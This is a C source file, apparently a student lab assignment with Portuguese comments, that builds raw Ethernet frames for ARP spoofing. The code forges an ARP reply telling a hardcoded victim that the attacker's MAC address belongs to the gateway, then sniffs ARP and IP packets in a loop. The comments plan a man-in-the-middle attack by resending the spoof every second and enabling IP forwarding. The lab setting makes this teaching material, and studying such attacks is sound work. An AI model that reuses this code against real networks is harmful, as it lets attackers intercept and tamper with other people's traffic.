#include "arp.h"

#include "socketSetup.h"

//PERGUNTAS:
//1) Descobrir com o professor como rodar aplicação no CORE-Emulator
//2) É possível assumir que a rede é conhecida? (IP e MAC de todos os PCs hardcoded) Ou deve-se descobrir em runtime?
//3) Como fazer com que o computador que está rodando o CORE-Emulator se comunique com as máquinas do Emulador (enviar ping, arp, etc...)?

//IMPLEMENTAR:
//1)API que imprime no console os campos de um pacote ARP (hw_type, prot_type, etc...)
//2)API para enviar pacotes ARP
//3)API para receber pacotes ARP
//4)O programa deve enviar uma mensagem ARP a cada segundo para manter a tabela ARP das vítimas atualizadas. Dica: usar função clock() da lib <time.h>. Exemplo em https://stackoverflow.com/questions/17167949/how-to-use-timer-in-c
//5)man-in-the-middle: Habilitar IP Forwarding na máquina atacante. Executar o comando no Linux: $ echo 1 > /proc/sys/net/ipv4/ip_forward


int main(int argc, char *argv[])
{
	int result = 0;	//Operation result
	//Auxiliary struct that holds essential information to send / receive data using sockets
	//For more information, see "SocketSethup.h"
	socket_aux socketInfo;	
	int numbytes;

	char gateway_mac[6] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x00};
	unsigned char gateway_ip[4] = {10, 0, 0, 1};
	char victim_mac[6] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x01};
	unsigned char victim_ip[4] = {10, 0, 0, 20};

	union eth_buffer buffer_u;	

	result = socketSetup(argc, argv, &socketInfo);
	    
	/* End of configuration. Now we can send and receive data using raw sockets. */

	if(result == 1)
	{
		/* To send data (in this case we will cook an ARP packet and broadcast it =])... */
		
		/* fill the Ethernet frame header */
		memcpy(buffer_u.cooked_data.ethernet.dst_addr, victim_mac, ETH_ALEN);
		memcpy(buffer_u.cooked_data.ethernet.src_addr, socketInfo.this_mac, ETH_ALEN);
		buffer_u.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);

		/* fill payload data (incomplete ARP request example) */
		buffer_u.cooked_data.payload.arp.hw_type = htons(1);	//Hardware type: 1(Ethernet)
		buffer_u.cooked_data.payload.arp.prot_type = htons(ETH_P_IP);	//Protocol type: IPV4(0x0800)
		buffer_u.cooked_data.payload.arp.hlen = 6;	//Hardware Length: MAC address length (6 bytes)
		buffer_u.cooked_data.payload.arp.plen = 4;	//Protocol Length: Length (in octets) of IPV4 address field (4 bytes)
		buffer_u.cooked_data.payload.arp.operation = htons(2);	//Operation: 1 for Request; 2 for reply
		//ARP Spoofing
		//Send a fake ARP Reply message to the victim PC saying that the MAC Address of this PC (attacker) is the Default Gateway MAC Address
		memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, socketInfo.this_mac, ETH_ALEN);	//Source MAC Address
		memcpy(buffer_u.cooked_data.payload.arp.src_paddr, gateway_ip, 4);	//Source IPV4 address
		memcpy(buffer_u.cooked_data.payload.arp.tgt_hwaddr, victim_mac, ETH_ALEN);	//Target MAC Address
		memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, victim_ip, 4);	//Target IPV4 address

		/* Send it.. */
		memcpy(socketInfo.socket_address.sll_addr, victim_mac, ETH_ALEN);
		if (sendto(socketInfo.sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socketInfo.socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Send failed\n");

		
		/* To receive data (in this case we will inspect ARP and IP packets)... */
		
		while (1){
			numbytes = recvfrom(socketInfo.sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
			if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
				printf("ARP packet, %d bytes - operation %d\n", numbytes, ntohs(buffer_u.cooked_data.payload.arp.operation));
				continue;
			}
			if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
				printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
					numbytes,
					buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
					buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
					buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
					buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
					buffer_u.cooked_data.payload.ip.proto
				);
				continue;
			}
					
			printf("got a packet, %d bytes\n", numbytes);
		}

		shutdown(socketInfo.sockfd, 2);   //Stop both reception and transmission of the socket
	}

	return 0;
}
